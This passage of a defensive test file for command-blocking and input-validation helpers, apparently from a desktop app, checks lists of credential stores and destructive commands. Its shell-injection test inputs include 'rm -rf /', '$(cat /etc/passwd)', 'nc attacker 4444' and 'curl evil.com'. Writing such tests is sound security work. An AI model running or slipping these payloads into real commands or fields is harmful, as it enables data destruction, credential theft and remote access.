      'Get-Process | Sort-Object CPU -Descending',
      'dir C:\\Users\\test',
      'type C:\\Users\\test\\file.txt',
      'powershell -Command "Get-Date"',
      'pwsh -Command "Write-Host hello"',
    ])('allows: %s', (cmd) => {
      expect(checkDangerousCommand(cmd).blocked).toBe(false)
    })
  })

  // ── Chained commands ──────────────────────────────────────────────────────

  describe('chained commands', () => {
    it('blocks dangerous command in chain: echo hi && rm -rf /', () => {
      expect(checkDangerousCommand('echo hi && rm -rf /').blocked).toBe(true)
    })

    it('blocks dangerous command after pipe: cat file | rm -rf /', () => {
      // Our pattern uses [^;|&] delimiters for PowerShell, but the rm patterns
      // don't — they check the whole string. This should still match.
      expect(checkDangerousCommand('cat file | rm -rf /').blocked).toBe(true)
    })
  })
})


// ═══════════════════════════════════════════════════════════════════════════════
// PATTERN COMPLETENESS
// ═══════════════════════════════════════════════════════════════════════════════

describe('pattern completeness', () => {
  it('CREDENTIAL_PATTERNS covers all major credential stores', () => {
    const labels = CREDENTIAL_PATTERNS.map(p => p.label)
    expect(labels).toContain('SSH key/config')
    expect(labels).toContain('GPG keyring')
    expect(labels).toContain('AWS credentials')
    expect(labels).toContain('Azure access tokens')
    expect(labels).toContain('GCP credentials')
    expect(labels).toContain('Docker credentials')
    expect(labels).toContain('Kubernetes config (contains cluster tokens)')
    expect(labels).toContain('Git stored credentials')
    expect(labels).toContain('macOS Keychain')
    expect(labels).toContain('browser password database')
    expect(labels).toContain('Firefox credential/cookie store')
    expect(labels).toContain('Windows Credential Store')
  })

  it('SYSTEM_DIR_PATTERNS_WIN32 covers critical Windows dirs', () => {
    const labels = SYSTEM_DIR_PATTERNS_WIN32.map(p => p.label)
    expect(labels).toContain('Windows system directory')
    expect(labels).toContain('Program Files directory')
    expect(labels).toContain('ProgramData directory')
    expect(labels).toContain('Program Files (8.3 short name)')
  })

  it('SYSTEM_DIR_PATTERNS_UNIX covers critical Unix dirs', () => {
    const labels = SYSTEM_DIR_PATTERNS_UNIX.map(p => p.label)
    expect(labels).toContain('boot directory')
    expect(labels).toContain('system binary directory')
    expect(labels).toContain('macOS System directory')
    expect(labels).toContain('device node')
    expect(labels).toContain('proc filesystem')
  })

  it('DANGEROUS_COMMAND_PATTERNS covers all major attack vectors', () => {
    const reasons = DANGEROUS_COMMAND_PATTERNS.map(p => p.reason)
    // Unix
    expect(reasons.some(r => r.includes('rm -rf /'))).toBe(true)
    expect(reasons.some(r => r.includes('home directory'))).toBe(true)
    // Windows cmd
    expect(reasons.some(r => r.includes('rd /s'))).toBe(true)
    expect(reasons.some(r => r.includes('format'))).toBe(true)
    // PowerShell
    expect(reasons.some(r => r.includes('Remove-Item'))).toBe(true)
    expect(reasons.some(r => r.includes('Format-Volume'))).toBe(true)
    expect(reasons.some(r => r.includes('Encoded PowerShell'))).toBe(true)
    // Disk
    expect(reasons.some(r => r.includes('dd'))).toBe(true)
    expect(reasons.some(r => r.includes('mkfs'))).toBe(true)
    // Other
    expect(reasons.some(r => r.includes('Fork bomb'))).toBe(true)
    expect(reasons.some(r => r.includes('registry'))).toBe(true)
  })
})


// ══════════════════════════════════════════════════════════════════��════════════
// NUMERIC VALIDATION (assertFiniteNumber)
// ═══════════════════════════════════════════════════════════════════════════════

describe('assertFiniteNumber', () => {

  // ── Accepts valid numbers ────────────────────────────────────────────────

  describe('accepts valid finite numbers', () => {
    it('accepts positive integers', () => {
      expect(assertFiniteNumber(42, 'x')).toBe(42)
    })

    it('accepts zero', () => {
      expect(assertFiniteNumber(0, 'x')).toBe(0)
    })

    it('accepts negative integers', () => {
      expect(assertFiniteNumber(-100, 'y')).toBe(-100)
    })

    it('accepts floating-point numbers', () => {
      expect(assertFiniteNumber(3.14, 'x')).toBeCloseTo(3.14)
    })

    it('accepts negative floats', () => {
      expect(assertFiniteNumber(-0.5, 'y')).toBeCloseTo(-0.5)
    })

    it('coerces numeric strings to numbers', () => {
      expect(assertFiniteNumber('42', 'x')).toBe(42)
    })

    it('coerces negative numeric strings', () => {
      expect(assertFiniteNumber('-100', 'y')).toBe(-100)
    })

    it('coerces float strings', () => {
      expect(assertFiniteNumber('3.14', 'x')).toBeCloseTo(3.14)
    })

    it('coerces string "0"', () => {
      expect(assertFiniteNumber('0', 'x')).toBe(0)
    })
  })

  // ── Rejects invalid values ───────────────────────────────────────────────

  describe('rejects non-finite / non-numeric values', () => {
    it('rejects NaN', () => {
      expect(() => assertFiniteNumber(NaN, 'x')).toThrow('finite number')
    })

    it('rejects Infinity', () => {
      expect(() => assertFiniteNumber(Infinity, 'x')).toThrow('finite number')
    })

    it('rejects -Infinity', () => {
      expect(() => assertFiniteNumber(-Infinity, 'x')).toThrow('finite number')
    })

    it('rejects non-numeric strings', () => {
      expect(() => assertFiniteNumber('abc', 'x')).toThrow('finite number')
    })

    it('coerces empty string to 0 (Number("") === 0, safe for shell)', () => {
      // Number('') is 0 which is finite — this is safe, not an injection vector.
      expect(assertFiniteNumber('', 'x')).toBe(0)
    })

    it('coerces null to 0 (Number(null) === 0, safe for shell)', () => {
      // Number(null) is 0 which is finite — this is safe, not an injection vector.
      expect(assertFiniteNumber(null, 'x')).toBe(0)
    })

    it('rejects undefined', () => {
      expect(() => assertFiniteNumber(undefined, 'x')).toThrow('finite number')
    })

    it('rejects objects', () => {
      expect(() => assertFiniteNumber({}, 'x')).toThrow('finite number')
    })

    it('rejects arrays', () => {
      expect(() => assertFiniteNumber([1, 2], 'x')).toThrow('finite number')
    })

    it('rejects booleans', () => {
      // Number(true) === 1 which IS finite, so this should actually pass
      expect(assertFiniteNumber(true, 'x')).toBe(1)
      expect(assertFiniteNumber(false, 'x')).toBe(0)
    })
  })

  // ── Shell injection payloads ─────────────────────────────────────────────

  describe('blocks shell injection payloads', () => {
    it('rejects semicolon injection: "100; rm -rf /"', () => {
      expect(() => assertFiniteNumber('100; rm -rf /', 'x')).toThrow('finite number')
    })

    it('rejects backtick injection: "`whoami`"', () => {
      expect(() => assertFiniteNumber('`whoami`', 'x')).toThrow('finite number')
    })

    it('rejects $() subshell injection', () => {
      expect(() => assertFiniteNumber('$(cat /etc/passwd)', 'x')).toThrow('finite number')
    })

    it('rejects pipe injection: "100 | nc attacker 4444"', () => {
      expect(() => assertFiniteNumber('100 | nc attacker 4444', 'y')).toThrow('finite number')
    })

    it('rejects && chain: "100 && curl evil.com"', () => {
      expect(() => assertFiniteNumber('100 && curl evil.com', 'x')).toThrow('finite number')
    })

    it('rejects newline injection', () => {
      expect(() => assertFiniteNumber('100\nrm -rf /', 'x')).toThrow('finite number')
    })

    it('rejects PowerShell injection: "100); Remove-Item C:\\ #"', () => {
      expect(() => assertFiniteNumber('100); Remove-Item C:\\ #', 'x')).toThrow('finite number')
    })

    it('rejects Swift injection: "100); exit(1) //"', () => {
      expect(() => assertFiniteNumber('100); exit(1) //', 'x')).toThrow('finite number')
    })
  })

  // ── Error message quality ────────────────────────────────────────────────

  describe('error messages include context', () => {
    it('includes the parameter name', () => {
      expect(() => assertFiniteNumber('abc', 'scroll_y')).toThrow('scroll_y')
    })

    it('includes the invalid string value in quotes', () => {
      expect(() => assertFiniteNumber('evil', 'x')).toThrow('"evil"')
    })

    it('stringifies non-string values', () => {
      expect(() => assertFiniteNumber(undefined, 'x')).toThrow('undefined')
    })
  })
})


// ═══════════════════════════════════════════════════════════════════════════════
// IPC SENDER VALIDATION (assertIpcSender)
// ═══════════════════════════════════════════════════════════════════════════════

describe('assertIpcSender', () => {

  // ── Passes when IDs match ────────────────────────────────────────────────

  describe('allows matching sender', () => {
    it('passes when sender ID matches main window ID', () => {
      expect(() => assertIpcSender(1, 1, 'test:channel')).not.toThrow()
    })

    it('passes with large IDs', () => {
      expect(() => assertIpcSender(999, 999, 'auth:get-token')).not.toThrow()
    })

    it('passes with ID zero', () => {
      expect(() => assertIpcSender(0, 0, 'test')).not.toThrow()
    })
  })

  // ── Rejects mismatched IDs ───────────────────────────────────────────────

  describe('rejects unauthorized senders', () => {
    it('rejects when IDs differ', () => {
      expect(() => assertIpcSender(1, 2, 'auth:sign-in')).toThrow('rejected')
    })

    it('rejects when main window ID is undefined (no window)', () => {
      expect(() => assertIpcSender(1, undefined, 'auth:get-token')).toThrow('rejected')
    })

    it('rejects rogue sender (higher ID suggesting later-created webContents)', () => {
      expect(() => assertIpcSender(5, 1, 'chat:send-message')).toThrow('rejected')
    })
  })

  // ── Error message quality ────────────────────────────────────────────────

  describe('error messages', () => {
    it('includes the channel name', () => {
      expect(() => assertIpcSender(3, 1, 'auth:get-token')).toThrow('auth:get-token')
    })

    it('includes the sender ID', () => {
      expect(() => assertIpcSender(42, 1, 'test')).toThrow('id=42')
    })

    it('includes the main window ID', () => {
      expect(() => assertIpcSender(3, 7, 'test')).toThrow('id=7')
    })

    it('shows "none" when main window ID is undefined', () => {
      expect(() => assertIpcSender(1, undefined, 'test')).toThrow('none')
    })
  })
})
